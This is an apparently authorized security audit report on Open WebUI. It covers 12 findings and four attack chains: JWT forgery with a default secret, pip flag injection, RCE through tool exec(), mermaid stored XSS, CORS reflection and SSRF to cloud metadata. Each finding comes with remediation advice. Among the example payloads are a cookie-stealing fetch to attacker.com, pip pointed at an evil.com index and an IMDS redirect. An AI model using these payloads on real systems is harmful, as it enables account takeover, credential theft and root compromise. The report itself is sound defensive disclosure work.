# Open WebUI Security Audit Report

**Date:** 2026-04-22
**Auditor:** AutoFyn Security
**Product:** Open WebUI (ghcr.io/open-webui/open-webui)
**Commit tested:** main branch (post-f162d4de)
**Severity scale:** Critical / High / Medium / Low / Informational

---

## Executive Summary

This audit of Open WebUI identified 12 vulnerabilities — 4 Critical, 6 High, 2 Medium — across authentication, authorization, input validation, and frontend rendering. Four attack chains were demonstrated against a live Docker instance with the default configuration. The worst case scenario is a fully unauthenticated attacker achieving persistent root-level code execution on the host, stealing all API keys and user data, and establishing a backdoor that survives container restarts. pip-install deployments and any deployment where `WEBUI_SECRET_KEY` is left at the publicly known default are immediately exploitable without credentials; Docker deployments using a randomized secret are still affected by Findings 6–12, which do not depend on JWT secret knowledge.

---

## Scope & Methodology

| In Scope | Out of Scope |
|---|---|
| Default-configuration vulnerabilities | Admin-configured misconfigurations |
| JWT forgery via hardcoded default secret | Social engineering |
| Admin data exfiltration (consequence of Finding 1) | Physical access |
| SSRF via webhook and RAG web fetch | |
| User enumeration by verified/pending users | |
| CORS wildcard origin reflection | |
| Token revocation no-op without Redis | |
| OAuth JWT cookie without HttpOnly | |
| Stored XSS via mermaid diagram rendering | |
| Supply chain RCE via pip flag injection | |
| Non-admin RCE via tool exec() with workspace.tools | |

All testing used static source code review of the Python/FastAPI backend and dynamic PoC testing against a Docker container with `-e WEBUI_SECRET_KEY=t0p-s3cr3t` (simulating pip-install default behavior). All PoC scripts use only standard HTTP requests and PyJWT — no memory corruption or framework exploitation. All exploits were confirmed against Open WebUI v0.9.1; evidence is in `autofyn_audit/evidence/`.

---

## Attack Chains

### Chain 1: Unauthenticated to Root RCE + Persistent Backdoor (Findings 1 + 10) — CVSS 9.8

An unauthenticated attacker creates a free account, forges an admin JWT using the publicly known default secret, then creates a tool whose frontmatter requirements field contains injected pip flags. The server runs the pip command with attacker-controlled flags, pulling a malicious package from an attacker-controlled index whose `setup.py` executes arbitrary code as root. Because the tool's requirements are reinstalled on every server restart, the backdoor persists across container restarts.

1. Sign up a free account via `POST /api/v1/auths/signup`
2. Leak admin email via `GET /api/v1/auths/admin/details`
3. Leak admin user ID via `GET /api/v1/users/search`
4. Forge admin JWT: `jwt.encode({'id': admin_id}, 't0p-s3cr3t', 'HS256')`
5. Create tool with requirements: `setuptools, --extra-index-url, https://evil.com/simple/, --trusted-host, evil.com, setuptools`
6. Server executes `pip install ... --extra-index-url https://evil.com/simple/` — malicious `setup.py` runs as root
7. On next restart, `install_tool_and_function_dependencies()` at `plugin.py:407` reinstalls the payload

```
[Attacker: no credentials]
    |
    +--signup--> [user account + ID]
    +--admin/details--> [admin email]
    +--users/search--> [admin user ID]
    +--forge JWT 't0p-s3cr3t'--> [admin token]
    |
    +--POST /tools/create (malicious requirements)
         |
         v
    [pip runs setup.py as root] --> [reverse shell / data exfil]
         |
         v
    [startup hook] --> [backdoor reinstalled on every restart]
```

**PoC:** `autofyn_audit/exploit_full_rce_chain.py` — run with `python3 exploit_full_rce_chain.py --target http://localhost:3000`

**Impact:** Full root code execution on the server with persistence. Attacker controls the host process, filesystem, and all secrets after a single unauthenticated HTTP request sequence.

---

### Chain 2: Unauthenticated to Root RCE via Tool Code Execution (Findings 1 + 12) — CVSS 9.1

An unauthenticated attacker forges an admin JWT (same as Chain 1), uses that token to grant `workspace.tools` permission to all users, then creates a tool whose Python content contains arbitrary module-level code. The `exec()` call at `plugin.py:231` runs that code immediately and unconditionally on the server as root. The permission name gives no indication to an admin that granting it enables server-side OS execution.

1. Sign up, leak admin email and ID, forge admin JWT (same as Chain 1, steps 1–4)
2. `POST /api/v1/users/default/permissions` with `{"workspace": {"tools": true}}` — grants permission to all users
3. `POST /api/v1/tools/create` with content containing `import subprocess; subprocess.check_output(['id'])`
4. `exec()` fires at `plugin.py:231` — HTTP 200 confirms code ran as root
5. Read `/etc/passwd`, exfiltrate `WEBUI_SECRET_KEY`, establish reverse shell

```
[Attacker: no credentials]
    |
    +--forge admin JWT--> [admin token]
    +--grant workspace.tools to all users
    +--POST /tools/create (module-level subprocess code)
         |
         v
    [exec() at plugin.py:231 runs as root]
         |
         v
    [full filesystem access / reverse shell]
```

**PoC:** `autofyn_audit/exploit_tool_exec_rce.py` — run with `python3 exploit_tool_exec_rce.py --target http://localhost:3000`

**Impact:** Immediate root code execution on the server with no filesystem or network restrictions. All secrets, keys, and user data are readable; outbound connections can establish persistent access.

---

### Chain 3: Stored XSS to Persistent Account Takeover (Findings 9 + 8 + 6 + 7) — CVSS 8.7

Any authenticated user uploads a `.md` file with a mermaid code block containing an HTML payload. When a victim with an OAuth session previews that file, `wrapper.innerHTML = svg` in `FilePreview.svelte:140` executes the payload without sanitization. The payload reads `document.cookie` (possible because the OAuth cookie has `httponly=False`), exfiltrates the token to the attacker, and — thanks to CORS origin reflection — the attacker can make authenticated API calls from any origin. Even after the victim logs out, the token remains valid for up to 4 weeks because token revocation is a no-op without Redis.

1. Upload `.md` file containing: `` ```mermaid `` with `<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>` in a node label
2. Victim with OAuth session opens the file in FileNav viewer
3. XSS fires; `document.cookie` exfiltrated (Finding 8: `httponly=False` on OAuth cookie)
4. Attacker sends `Authorization: Bearer <stolen-token>` from `https://evil.example.com`
5. CORS middleware reflects `Origin` header — browser allows cross-origin reads (Finding 6)
6. Victim logs out — `invalidate_token()` is a no-op without Redis (Finding 7)
7. Attacker retains full authenticated access until JWT expiry (default: 4 weeks)

```
[Attacker: low-privilege account]
    |
    +--upload malicious .md file
         |
    [Victim opens file in FilePreview]
         |
         v
    [XSS fires: wrapper.innerHTML = svg (no DOMPurify)]
         |
         v
    [document.cookie readable: httponly=False (oauth.py:1723)]
         |
         v
    [token exfiltrated to attacker]
         |
         v
    [CORS reflects Origin: attacker reads API responses cross-origin]
    [Redis absent: victim logout is no-op; token valid up to 4 weeks]
         |
         v
    [Persistent account takeover]
```

**PoC:** `autofyn_audit/exploit_cors_chain.py` — run with `python3 exploit_cors_chain.py --target http://localhost:3000`

**Impact:** Persistent takeover of any OAuth-authenticated user account, including admins. The attacker reads all chat history and — if the victim is an admin — all API keys and user data, for up to 4 weeks after the victim logs out.

---

### Chain 4: SSRF to Cloud IAM Credential Theft (Finding 11) — CVSS 8.5

Any verified user can POST a URL to `/api/v1/retrieval/process/web`. The URL filter checks whether the full URL string ends with a blocklisted hostname, which any URL with a path suffix bypasses. More critically, `requests.get()` follows HTTP 302 redirects without re-validating the destination IP — an attacker-controlled server can redirect the Open WebUI server directly to cloud IMDS endpoints after the initial URL passes validation.

1. Create a regular user account
2. Set up `https://attacker.com/redir` to respond `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
3. `POST /api/v1/retrieval/process/web` with `{"url": "https://attacker.com/redir"}`
4. `validate_url()` passes (public IP, not in blocklist)
5. `requests.get()` follows 302 to IMDS — Open WebUI returns IAM credentials to attacker

```
[Attacker: verified user only]
    |
    +--POST /process/web {"url": "https://attacker.com/redir"}
         |
    [validate_url: attacker.com resolves to public IP -> PASS]
         |
    [requests.get follows 302 to http://169.254.169.254/...]
         |
         v
    [IMDS returns IAM role credentials]
         |
         v
    [Attacker uses AWS/GCP/Azure credentials for lateral movement]
```

**PoC:** `autofyn_audit/exploit_ssrf_rag.py` — run with `python3 exploit_ssrf_rag.py --target http://localhost:3000`

**Impact:** Theft of cloud IAM credentials on AWS, GCP, or Azure deployments, enabling lateral movement to S3, RDS, or other cloud services with the permissions of the EC2/VM instance role.

---

## Individual Findings

### Finding 1: JWT Forgery via Hardcoded Default Secret (CRITICAL)

**CVSS 3.1:** 9.8 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**Affected code:** `backend/open_webui/env.py:564-567`, `backend/open_webui/utils/auth.py:50`

**Description:** Open WebUI uses `t0p-s3cr3t` as the default JWT signing secret when `WEBUI_SECRET_KEY` is not set. The secret is assigned at module import time and never regenerated. The official Docker image mitigates this by generating a random key in `start.sh`, but pip-install deployments and any deployment where `WEBUI_SECRET_KEY` is explicitly set to the default are fully vulnerable. Any attacker who knows this public default can forge a valid JWT for any user ID.

**Exploitation:**
1. `GET /api/version` — confirm target is Open WebUI
2. `POST /api/v1/auths/signup` — create attacker account, obtain user ID
3. `GET /api/v1/auths/admin/details` — leak admin email (accessible to any authenticated user)
4. `GET /api/v1/users/search?query=<email>` — leak admin user ID
5. `jwt.encode({'id': admin_id, 'jti': uuid4(), 'iat': now}, 't0p-s3cr3t', 'HS256')` — forge admin token
6. `GET /openai/config Authorization: Bearer <forged>` — confirm admin access

**PoC:** `autofyn_audit/exploit_jwt_forgery.py`

**Impact:** Complete administrative control over the instance; all subsequent Findings 2–5 are direct consequences.

**Remediation:**
- Generate a cryptographically random secret on first startup using `secrets.token_hex(32)` and persist it to `data/.secret_key`
- Never fall back to a hardcoded string; raise an error if the key cannot be read or written
- Rotate the default in existing deployments and document the requirement to set `WEBUI_SECRET_KEY`

---

### Finding 10: Supply Chain RCE via Pip Flag Injection (CRITICAL)

**CVSS 3.1:** 9.8 chained (Finding 1) / 9.1 standalone — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

**Affected code:** `backend/open_webui/utils/plugin.py:383-401`, `Dockerfile:23-24`

**Description:** `install_frontmatter_requirements()` splits the tool's frontmatter `requirements` field by comma and passes each token as a separate argv element to `subprocess.check_call([python, -m, pip, install, ...])`. No validation rejects items starting with `-`. An attacker injects `--extra-index-url` and `--trusted-host` to redirect pip to a malicious index. The malicious package's `setup.py` runs arbitrary code. The Dockerfile defaults to `UID=0/GID=0`, so the code runs as root. Tool requirements are also reinstalled at every startup via `install_tool_and_function_dependencies()` at `plugin.py:407`, creating a persistent backdoor.

**Exploitation:**
1. Obtain admin token (or forge via Finding 1)
2. `POST /api/v1/tools/create` with frontmatter: `requirements: setuptools, --extra-index-url, https://evil.com/simple/, --trusted-host, evil.com, setuptools`
3. Server runs `pip install setuptools --extra-index-url https://evil.com/simple/ --trusted-host evil.com setuptools`
4. Pip fetches `setuptools` from `evil.com`; `setup.py` runs as root
5. On container restart, `main.py:658` calls `install_tool_and_function_dependencies()` — payload reinstalls automatically

**PoC:** `autofyn_audit/exploit_pip_injection.py`

**Impact:** Root code execution on the server, persistent across container restarts. Enables full data exfiltration, reverse shell, and lateral movement.

**Remediation:**
- Reject any requirement item starting with `-` in `install_frontmatter_requirements()` before passing to subprocess
- Use `--require-hashes` with a lockfile to prevent substitution attacks
- Run the container as non-root by overriding `ARG UID` and `ARG GID` in the Dockerfile
- Add `--no-deps` to block transitive dependency injection

---

### Finding 12: RCE via Tool exec() with workspace.tools Permission (CRITICAL)

**CVSS 3.1:** 9.1 standalone (PR:H) / effectively PR:N chained with Finding 1 — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

**Affected code:** `backend/open_webui/utils/plugin.py:231`, `backend/open_webui/routers/tools.py:326-396`

**Description:** `exec(content, module.__dict__)` at `plugin.py:231` runs all module-level Python submitted as a tool's content, immediately and without sandboxing, at tool creation time. Tool creation requires only `workspace.tools` permission — not admin role. Any admin enabling tool creation for LLM integrations unknowingly grants full server-side OS execution to permitted users. The Dockerfile defaults to `UID=0/GID=0`, so `exec()` runs as root. The tool update path also triggers `exec()` and is accessible to the tool creator.

**Exploitation:**
1. Admin (or attacker with forged JWT) `POST /api/v1/users/default/permissions` with `{"workspace": {"tools": true}}`
2. `POST /api/v1/tools/create` with content: `import subprocess\n_r = subprocess.check_output(['id'])\nclass Tools: pass`
3. `exec()` fires at `plugin.py:231` immediately — HTTP 200 confirms code ran as root
4. Read `/etc/passwd`, exfiltrate `WEBUI_SECRET_KEY`, establish reverse shell

**PoC:** `autofyn_audit/exploit_tool_exec_rce.py`

**Impact:** Immediate root code execution. Attacker reads the full filesystem, all secrets, and environment variables, and can establish persistent outbound access.

**Remediation:**
- Sandbox `exec()` using RestrictedPython, nsjail, gVisor, or Pyodide; at minimum run tool code in a subprocess as a non-root dedicated user
- Add an explicit admin confirmation warning when granting `workspace.tools`, stating that the permission enables arbitrary server-side code execution
- Run the container as non-root; add an audit log for all tool creation and update events

---

### Finding 9: Stored XSS via Mermaid Diagram Rendering (CRITICAL)

**CVSS 3.1:** 8.7 — `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N`

**Affected code:** `src/lib/utils/index.ts:1739`, `src/lib/components/chat/FileNav/FilePreview.svelte:136-141`

**Description:** Mermaid is initialized globally with `securityLevel: 'loose'` at `index.ts:1739`, which allows arbitrary HTML inside diagram node labels. `FilePreview.svelte:140` sets `wrapper.innerHTML = svg` directly after rendering — with no `DOMPurify` call. This is inconsistent with the chat message code path (`CodeBlock.svelte`), which routes mermaid output through `SVGPanZoom.svelte` and calls `DOMPurify.sanitize()`. Any authenticated user can upload a `.md` file with a mermaid XSS payload; it fires for any user who opens the file in the FileNav viewer. No default Content Security Policy is configured.

**Exploitation:**
1. Upload a `.md` file containing a mermaid block with `["<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"]` in a node label
2. Share the file link or wait for a victim to browse FileNav
3. Victim opens the file; `wrapper.innerHTML = svg` executes the payload
4. `document.cookie` exfiltrated (contains `token=<jwt>` for OAuth users due to Finding 8)

**PoC:** `autofyn_audit/exploit_mermaid_xss.py`

**Impact:** Stored XSS executing in any viewer's browser context. Enables OAuth cookie theft (Finding 8), which feeds the full CORS + token-revocation chain (Findings 6 + 7).

**Remediation:**
- Change `securityLevel: 'loose'` to `securityLevel: 'strict'` in `index.ts:1739`
- Add `DOMPurify.sanitize(svg)` before `wrapper.innerHTML = svg` in `FilePreview.svelte:140`, matching the existing pattern in `SVGPanZoom.svelte`
- Enable a default Content-Security-Policy header; currently opt-in only via `CONTENT_SECURITY_POLICY` environment variable

---

### Finding 11: SSRF via RAG Web Fetch URL Filter Bypass (HIGH)

**CVSS 3.1:** 8.5 — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`

**Affected code:** `backend/open_webui/utils/misc.py:61,65`, `backend/open_webui/retrieval/utils.py:182`

**Description:** `is_string_allowed()` at `misc.py:61,65` applies `str.endswith()` against the full URL string, not the parsed hostname. Blocklist entries like `!169.254.169.254` only match when the URL literally ends with that string; any URL with a trailing path bypasses the filter. More critically, `requests.get(url, stream=True)` at `retrieval/utils.py:182` follows HTTP 302 redirects without re-validating the destination IP — an attacker-controlled server can redirect to IMDS after initial URL validation passes. `SafeWebBaseLoader._fetch()` in the same codebase already sets `allow_redirects=False` correctly, making this an inconsistency within Open WebUI itself. Any verified user can call `/api/v1/retrieval/process/web`.

**Exploitation:**
1. Control `https://attacker.com/redir` to respond `302 Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. `POST /api/v1/retrieval/process/web` with `{"url": "https://attacker.com/redir"}`
3. `validate_url()` passes (public IP, not in blocklist by endsWith)
4. `requests.get()` follows 302 to IMDS — IAM credentials returned to attacker

**PoC:** `autofyn_audit/exploit_ssrf_rag.py`

**Impact:** IAM credential theft on AWS, GCP, or Azure, enabling lateral movement to other cloud services. Exploitable by any verified user without admin privileges.

**Remediation:**
- Parse the hostname with `urllib.parse.urlparse(url).hostname` before calling `is_string_allowed()` in `retrieval/web/utils.py:78`
- Set `allow_redirects=False` on `requests.get()` in `retrieval/utils.py:182`, matching `SafeWebBaseLoader._fetch()`
- Consider a DNS-rebinding-resistant approach that validates the resolved IP is not private before connecting

---

### Finding 6: CORS Wildcard Origin Reflection (HIGH)

**CVSS 3.1:** 8.1 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

**Affected code:** `backend/open_webui/config.py:1756`, `backend/open_webui/main.py:1390-1396`

**Description:** `CORS_ALLOW_ORIGIN` defaults to `'*'`. When `allow_origins=['*']` and `allow_credentials=True` are set together, Starlette's `CORSMiddleware` reflects the request `Origin` header back as `Access-Control-Allow-Origin` instead of the literal `*`, paired with `Access-Control-Allow-Credentials: true`. Any website holding a stolen token can make authenticated cross-origin API calls and read the full response body, because the browser sees a matching origin header and permits the read.

**Exploitation:**
1. Obtain a valid token by any means (e.g., via Finding 8 XSS)
2. From `https://evil.example.com`, call `fetch('https://target.com/api/v1/auths/', {headers: {'Authorization': 'Bearer <token>'}})`
3. Server responds with `Access-Control-Allow-Origin: https://evil.example.com` and `Access-Control-Allow-Credentials: true`
4. Browser permits the cross-origin read; attacker reads full response including sensitive user data

**PoC:** `autofyn_audit/exploit_cors_origin_reflection.py`

**Impact:** Every token-theft vector in this audit is amplified — any stolen token can be used from an attacker-controlled origin to read authenticated API responses, including admin-level data if the victim is an admin.

**Remediation:**
- Set `CORS_ALLOW_ORIGIN` to the specific production hostname(s); never use `'*'`
- If wildcard must be used, set `allow_credentials=False`
- Add a startup check that raises an error when `allow_origins=['*']` and `allow_credentials=True` are both set

---

### Finding 4: SSRF via Unvalidated Webhook URLs (HIGH)

**CVSS 3.1:** 8.1 — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:N`

**Affected code:** `backend/open_webui/main.py:2337-2352`, `backend/open_webui/utils/webhook.py:53-56`

**Description:** `POST /api/webhook` accepts any string as the webhook URL with no validation. The webhook fires on every signup and signin event, causing the server to POST user data to the configured URL. An attacker with admin access can set this to a cloud metadata endpoint or internal service address, turning every authentication event into an SSRF trigger that exfiltrates user data to attacker infrastructure.

**Exploitation:**
1. Obtain admin token (or forge via Finding 1)
2. `POST /api/webhook` with `{"url": "http://169.254.169.254/latest/meta-data/"}`
3. Trigger the webhook by registering any new user: `POST /api/v1/auths/signup`
4. Server POSTs signup data (email, ID, role) to the IMDS endpoint

**PoC:** `autofyn_audit/exploit_ssrf_webhook.py`

**Impact:** Server-side request forgery to cloud IMDS endpoints, internal services, and attacker infrastructure, exfiltrating user PII on every authentication event.

**Remediation:**
- Add a Pydantic validator on `UrlForm.url` that resolves the hostname and rejects private IP ranges (RFC 1918, 169.254.x.x, loopback)
- Maintain an allowlist of approved webhook domains if feasible
- Use a DNS-rebinding-resistant HTTP client that re-validates the resolved IP before connecting

---

### Finding 2: Admin API Key Exposure (HIGH)

**CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N` (standalone) / effective PR:N chained with Finding 1

**Affected code:** `backend/open_webui/routers/openai.py:236-243`

**Description:** `GET /openai/config` returns all configured OpenAI API keys in cleartext with no masking or partial redaction. Combined with Finding 1, an attacker retrieves all API keys in seconds with no prior credentials.

**Exploitation:**
1. Obtain admin token (or forge via Finding 1)
2. `GET /openai/config Authorization: Bearer <admin_token>`
3. Response body contains full `OPENAI_API_KEYS` list in plaintext

**PoC:** `autofyn_audit/exploit_admin_data_theft.py`

**Impact:** Full exposure of all configured API keys, enabling unauthorized charges, OpenAI usage data access, and use of keys for secondary attacks.

**Remediation:**
- Mask API keys in GET responses — return only the last 4 characters
- Use a separate endpoint or re-authentication flow to reveal full key values
- Encrypt keys at rest using a key derived from `WEBUI_SECRET_KEY`

---

### Finding 3: Database Export Data Theft (HIGH)

**CVSS 3.1:** 7.5 — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N` (standalone) / effective PR:N chained with Finding 1

**Affected code:** `backend/open_webui/routers/utils.py:105-123`, `backend/open_webui/config.py:1689`

**Description:** `GET /api/v1/utils/db/download` streams the entire SQLite database file to the caller. `ENABLE_ADMIN_EXPORT` defaults to `True`. The database contains all users with bcrypt-hashed passwords, full chat histories, API keys, and all other application data. Combined with Finding 1, an attacker downloads the complete database with no prior credentials.

**Exploitation:**
1. Obtain admin token (or forge via Finding 1)
2. `GET /api/v1/utils/db/download Authorization: Bearer <admin_token>`
3. Full SQLite file streamed in response body

**PoC:** `autofyn_audit/exploit_admin_data_theft.py`

**Impact:** Complete exfiltration of all application data. Password hashes can be subjected to offline cracking; all chat history and user PII are exposed.

**Remediation:**
- Default `ENABLE_ADMIN_EXPORT` to `False`; require explicit opt-in at deployment time
- Add a secondary confirmation step (re-authentication) before streaming the database
- Rate-limit and audit-log all export requests

---

### Finding 7: Token Revocation No-Op Without Redis (HIGH)

**CVSS 3.1:** 7.5 — `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`

**Affected code:** `backend/open_webui/utils/auth.py:229-276`, `backend/open_webui/routers/auths.py:780-781`

**Description:** `invalidate_token()` and `is_valid_token()` both guard all revocation logic behind `if request.app.state.redis:`. When Redis is not configured — the default for all Docker and pip-install deployments — both functions return immediately without performing any action. `GET /api/v1/auths/signout` calls `invalidate_token()`, which silently does nothing. Stolen tokens remain valid for their full JWT lifetime, which defaults to 4 weeks (`JWT_EXPIRES_IN=4w`).

**Exploitation:**
1. Obtain victim's token via any means (e.g., network interception or Finding 8)
2. Victim calls `GET /api/v1/auths/signout` — returns 200 but does nothing
3. Attacker sends `GET /api/v1/auths/ Authorization: Bearer <stolen-token>` — returns 200, token still valid
4. Attacker retains access until token's `exp` claim is reached

**PoC:** `autofyn_audit/exploit_token_revocation_bypass.py`

**Impact:** Stolen tokens cannot be invalidated by victim action. Combined with Finding 6, an attacker using a stolen token from a foreign origin retains access for up to 4 weeks after the victim logs out.

**Remediation:**
- Deploy Redis and configure it via `REDIS_URL` to activate the existing per-token revocation logic
- If Redis cannot be deployed, implement a short-lived server-side revocation list in the database rather than silently skipping revocation
- Reduce default `JWT_EXPIRES_IN` to limit exposure when revocation is unavailable

---

### Finding 8: OAuth Cookie Without HttpOnly (MEDIUM)

**CVSS 3.1:** 6.1 — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (standalone; severity escalates to HIGH when chained with Findings 6, 7, 9)

**Affected code:** `backend/open_webui/utils/oauth.py:1720-1727`

**Description:** The OAuth callback handler sets the JWT cookie with `httponly=False`. The password-login handler at `auths.py:127-134` uses `httponly=True` for the same cookie — a direct inconsistency in the same codebase. With `httponly=False`, the `token` cookie is accessible via `document.cookie` in JavaScript. Any XSS on the Open WebUI domain can steal the JWT of OAuth-authenticated users. Password-authenticated users are not affected by this specific finding.

**Exploitation:**
1. Inject an XSS payload on the Open WebUI domain (e.g., via Finding 9 mermaid XSS)
2. Victim with OAuth session triggers the payload: `fetch('https://attacker.com/steal?t=' + document.cookie)`
3. Attacker receives `token=<jwt>`
4. Token used from `https://evil.example.com` with Authorization header (Finding 6 enables cross-origin reads)
5. Victim logs out — token persists (Finding 7)

**PoC:** `autofyn_audit/exploit_oauth_cookie_httponly.py`

**Impact:** OAuth session tokens are readable by any XSS payload on the domain, completing the stored XSS → account takeover chain.

**Remediation:**
- Change `httponly=False` to `httponly=True` in `oauth.py:1723`
- If frontend JavaScript requires token access, use a separate non-HttpOnly session indicator; keep the actual JWT HttpOnly
- Audit all other `set_cookie()` calls for the same inconsistency

---

### Finding 5: User Enumeration via Search Endpoint (MEDIUM)

**CVSS 3.1:** 5.3 — `AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N`

**Affected code:** `backend/open_webui/routers/users.py:115-137`, `backend/open_webui/routers/auths.py:922-947`

**Description:** `GET /api/v1/users/search` returns full user objects including `id`, `email`, `name`, and `role` to any verified user. An empty query pages through all users. Additionally, `GET /api/v1/auths/admin/details` is accessible to any authenticated user — including pending users not yet approved — disclosing the admin's name and email. These two endpoints together are prerequisite steps for Finding 1 (admin ID discovery for JWT forgery).

**Exploitation:**
1. Register any account (even pending)
2. `GET /api/v1/auths/admin/details` — admin email disclosed
3. `GET /api/v1/users/search?query=<admin_email>` — admin user ID and role disclosed
4. Enumerate all users with repeated paged queries

**PoC:** Used as prerequisite steps in `autofyn_audit/exploit_jwt_forgery.py` and `autofyn_audit/exploit_chain.py`

**Impact:** Enables targeted phishing, credential stuffing preparation, and is a required step for the JWT forgery attack chain.

**Remediation:**
- Restrict `/users/search` to admin role, or filter `email` and `id` from non-admin responses
- Restrict `/api/v1/auths/admin/details` to verified users at minimum; consider requiring admin role for the email field

---

## Deployment Impact Matrix

| Finding | pip-install | Docker (default) | Docker (explicit `t0p-s3cr3t`) | Cloud-hosted |
|---|---|---|---|---|
| F1: JWT Forgery | Vulnerable | Not vulnerable | Vulnerable | Depends on secret |
| F2: Admin API Key Exposure | Chained via F1 | Not via F1 alone | Chained via F1 | Depends on secret |
| F3: Database Export | Chained via F1 | Not via F1 alone | Chained via F1 | Depends on secret |
| F4: SSRF Webhook | Chained via F1 | Not via F1 alone | Chained via F1 | Depends on secret |
| F5: User Enumeration | Vulnerable | Vulnerable | Vulnerable | Vulnerable |
| F6: CORS Reflection | Vulnerable | Vulnerable | Vulnerable | Vulnerable |
| F7: Token Revocation | Vulnerable | Vulnerable | Vulnerable | Vulnerable |
| F8: OAuth Cookie | Vulnerable | Vulnerable | Vulnerable | Vulnerable |
| F9: Stored XSS | Vulnerable | Vulnerable | Vulnerable | Vulnerable |
| F10: Pip Injection | Chained via F1 | Not via F1 alone | Chained via F1 | Depends on secret |
| F11: SSRF RAG | Vulnerable | Vulnerable | Vulnerable | Vulnerable (high impact) |
| F12: Tool exec() | Chained via F1 | Not via F1 alone | Chained via F1 | Depends on secret |

---

## Reproduction Guide

### Prerequisites

- Docker installed and running
- Python 3.9+ with `requests` and `PyJWT` installed

### Setup

```bash
bash autofyn_audit/setup.sh
```

### Running Individual Exploits

| Script | What it tests | Example command |
|---|---|---|
| `exploit_jwt_forgery.py` | Finding 1: JWT forgery via default secret | `python3 exploit_jwt_forgery.py --target http://localhost:3000` |
| `exploit_admin_data_theft.py` | Findings 2 & 3: API key + DB exfiltration | `python3 exploit_admin_data_theft.py --target http://localhost:3000` |
| `exploit_ssrf_webhook.py` | Finding 4: SSRF via unvalidated webhook URL | `python3 exploit_ssrf_webhook.py --target http://localhost:3000` |
| `exploit_cors_origin_reflection.py` | Finding 6: CORS wildcard origin reflection | `python3 exploit_cors_origin_reflection.py --target http://localhost:3000` |
| `exploit_token_revocation_bypass.py` | Finding 7: Token revocation no-op | `python3 exploit_token_revocation_bypass.py --target http://localhost:3000` |
| `exploit_oauth_cookie_httponly.py` | Finding 8: OAuth cookie httponly=False | `python3 exploit_oauth_cookie_httponly.py --target http://localhost:3000` |
| `exploit_mermaid_xss.py` | Finding 9: Stored XSS via mermaid rendering | `python3 exploit_mermaid_xss.py --target http://localhost:3000` |
| `exploit_pip_injection.py` | Finding 10: Pip flag injection in requirements | `python3 exploit_pip_injection.py --target http://localhost:3000` |
| `exploit_ssrf_rag.py` | Finding 11: SSRF via RAG web fetch bypass | `python3 exploit_ssrf_rag.py --target http://localhost:3000` |
| `exploit_tool_exec_rce.py` | Finding 12: RCE via tool exec() | `python3 exploit_tool_exec_rce.py --target http://localhost:3000` |

### Running Attack Chains

| Script | Chain demonstrated | Example command |
|---|---|---|
| `exploit_chain.py` | Findings 1–4: signup → JWT forgery → data theft → SSRF | `python3 exploit_chain.py --target http://localhost:3000` |
| `exploit_full_rce_chain.py` | Chain 1: Findings 1 + 10, unauthenticated → root RCE + persistence | `python3 exploit_full_rce_chain.py --target http://localhost:3000` |
| `exploit_tool_exec_rce.py` | Chain 2: Findings 1 + 12, unauthenticated → root RCE via exec() | `python3 exploit_tool_exec_rce.py --target http://localhost:3000` |
| `exploit_cors_chain.py` | Chain 3: Findings 9 + 8 + 6 + 7, stored XSS → persistent account takeover | `python3 exploit_cors_chain.py --target http://localhost:3000` |
| `exploit_ssrf_rag.py` | Chain 4: Finding 11, verified user → cloud IAM credential theft | `python3 exploit_ssrf_rag.py --target http://localhost:3000` |

All scripts accept `--target <url>` and produce structured output with `[+]`, `[-]`, `[*]`, `[!]` prefixes. Run `python3 <script> --help` for options.

### Teardown

```bash
bash autofyn_audit/teardown.sh
```

---

## Remediation Priority

1. **Generate a random `WEBUI_SECRET_KEY` on first startup and persist it; never fall back to a hardcoded value.** Addresses Finding 1 and eliminates the unauthenticated path to Findings 2, 3, 4, 10, and 12.

2. **Sandbox `exec()` in tool/function loading and add an admin warning when granting `workspace.tools`.** Addresses Finding 12; prevents root RCE even if Finding 1 is exploited.

3. **Reject pip requirement items starting with `-` in `install_frontmatter_requirements()` and run the container as non-root.** Addresses Finding 10; eliminates persistent supply-chain RCE vector.

4. **Change mermaid `securityLevel` to `'strict'` and add `DOMPurify.sanitize(svg)` before `wrapper.innerHTML` in `FilePreview.svelte`.** Addresses Finding 9; breaks the XSS entry point for Chain 3.

5. **Set `CORS_ALLOW_ORIGIN` to specific production hostnames; never combine `allow_origins=['*']` with `allow_credentials=True`.** Addresses Finding 6; affects all deployments.

6. **Parse the URL hostname before blocklist checks in `retrieval/web/utils.py` and set `allow_redirects=False` in `get_content_from_url()`.** Addresses Finding 11; closes the IMDS redirect vector for all verified users.

7. **Set `httponly=True` on the OAuth JWT cookie in `oauth.py:1723` to match the password-login code path.** Addresses Finding 8; breaks the XSS-to-cookie-theft step in Chain 3.

8. **Deploy Redis and configure `REDIS_URL`, or implement a database-backed revocation list; reduce default `JWT_EXPIRES_IN`.** Addresses Finding 7; ensures stolen tokens can be invalidated.

9. **Validate webhook URLs against private IP ranges before accepting; reject RFC 1918, link-local, and loopback addresses.** Addresses Finding 4; prevents SSRF via the webhook trigger path.

10. **Mask API keys in `GET /openai/config` responses and default `ENABLE_ADMIN_EXPORT` to `False`.** Addresses Findings 2 and 3; limits data exposure even when admin access is obtained.

11. **Restrict `GET /api/v1/users/search` to admin role and restrict `GET /api/v1/auths/admin/details` to verified users.** Addresses Finding 5; removes the admin ID discovery step required for JWT forgery.

---

*This report was produced for authorized security testing purposes only.*
